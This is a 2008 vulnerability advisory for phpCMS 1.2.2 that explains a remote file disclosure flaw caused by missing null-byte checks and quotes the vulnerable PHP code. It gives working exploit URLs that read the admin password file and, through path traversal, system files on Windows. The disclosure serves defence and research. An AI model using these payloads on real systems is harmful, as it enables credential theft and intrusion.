@@ -1,0 +1,154 @@
+Digital Security Research Group [DSecRG] Advisory       #DSECRG-08-005
+
+
+Application:                    phpCMS
+Versions Affected:              1.2.2
+Vendor URL:                     http://www.phpcms.de
+Bug:                            Remote File Disclosure, Get admin password
+Exploits:                       YES
+Reported:                       10.01.2008
+Vendor response:                12.01.2008
+Date of Public Advisory:        29.01.2008
+Authors:                        Alexandr Polyakov, Stas Svistunovich
+                                Digital Security Research Group [DSecRG] (research [at] dsec [dot] ru)
+
+
+
+Description
+***********
+
+phpCMS system has remote File Disclosure vulnerability in page /parser/include/class.cache_phpcms.php
+
+
+Details
+*******
+
+Attacer can read any files in web directory.
+
+In file parser/parser.php include class.cache_phpcms.php
+
+---------------------------------------
+
+        // Load the i18n Handler
+        if (isset ($_GET ['file']) && isset($DEFAULTS->I18N) && 'on' == $DEFAULTS->I18N) {
+                include(PHPCMS_INCLUDEPATH.'/class.lib_i18n_phpcms.php');
+                $I18N = &new i18n;
+        }
+        $PHPCMS->check_secure_stealth();
+        include(PHPCMS_INCLUDEPATH.'/class.cache_phpcms.php');
+        exit;
+
+---------------------------------------
+
+
+In file class.cache_phpcms.php function GetFile() parse URL and return full file name or default value.
+Function checks file extension but does't check for null byte injection.
+
+To read file  attacker must append a valid extension with null byte to file like a  "%00.gif" or smth.
+
+---------------------------------------
+
+// filequery exists, but filename is empty? -> set the defaultvalue for filename
+if(!stristr($temp, $DEFAULTS->PAGE_EXTENSION) AND
+        !stristr($temp, '.gif') AND
+        !stristr($temp, '.png') AND
+        !stristr($temp, '.jpg') AND
+        !stristr($temp, '.js') AND
+        !stristr($temp, '.css') AND
+        !stristr($temp, '.htm') AND
+        !stristr($temp, '.html'))
+
+{       if(substr($temp, -1) != '/') {
+                $temp = trim($temp).'/'.$DEFAULTS->PAGE_DEFAULTNAME;
+                $temp.= $DEFAULTS->PAGE_EXTENSION;
+        } else {
+                $temp = trim($temp).$DEFAULTS->PAGE_DEFAULTNAME;
+                $temp.= $DEFAULTS->PAGE_EXTENSION;
+        }
+}
+
+---------------------------------------
+
+
+In file class.cache_phpcms.php function CheckFile() take file name and if file exist read it and print file contents.
+
+---------------------------------------
+$PfadUndDatei = $this->GetFile();
+
+$this->name = basename($PfadUndDatei);
+$this->path = dirname($PfadUndDatei);
+...
+
+// there's no contentfile with this name -> errorpage or errormessage
+if(!file_exists($DEFAULTS->DOCUMENT_ROOT.$this->path.'/'.$this->name)) {
+        $errorname = basename($DEFAULTS->ERROR_PAGE_404);
+        $errorpath = dirname($DEFAULTS->ERROR_PAGE_404);
+        ...
+...
+
+$fsize = filesize($DEFAULTS->DOCUMENT_ROOT.$this->path.'/'.$this->name);
+$fd = fopen($DEFAULTS->DOCUMENT_ROOT.$this->path.'/'.$this->name, "rb");
+$contents = fread($fd, $fsize);
+$contents = trim($contents);
+$fsize = strlen($contents);
+fclose($fd);
+...
+
+echo $contents;
+
+---------------------------------------
+
+
+Example:
+
+
+
+http://[server]/[installdir]/parser/parser.php?file=/parser/include/default.php%00.gif
+
+default.php includes admin password and other defaults:
+
+---------------------------------------
+
+class defaults {
+        function defaults() {
+                global $PHP, $PHPCMS;
+                if(!defined("_DEFAULTS_")) {
+                        define("_DEFAULTS_", TRUE);
+                }
+
+                $this->PASS = 'YourPasswordHere';
+...
+
+---------------------------------------
+
+
+In windows we can read any local file:
+
+http://[server]/[installdir]/parser/parser.php?file=\..\..\..\..\..\..\..\..\..\..\boot.ini%00.gif
+
+
+
+
+http://www.phpcms.de/download/index.en.html
+
+
+
+
+
+
+About
+*****
+
+
+
+
+Digital Security is leading IT security company in Russia, providing information security consulting, audit 
+and penetration testing services, risk analysis and ISMS-related services and certification for ISO/IEC 27001:2005 
+and PCI DSS standards. Digital Security Research Group focuses on web application and database security problems with 
+vulnerability reports, advisories and whitepapers posted regularly on our website.
+
+
+Contact:        research [at] dsec [dot] ru
+                http://www.dsec.ru (in Russian)
+
+# milw0rm.com [2008-01-29]
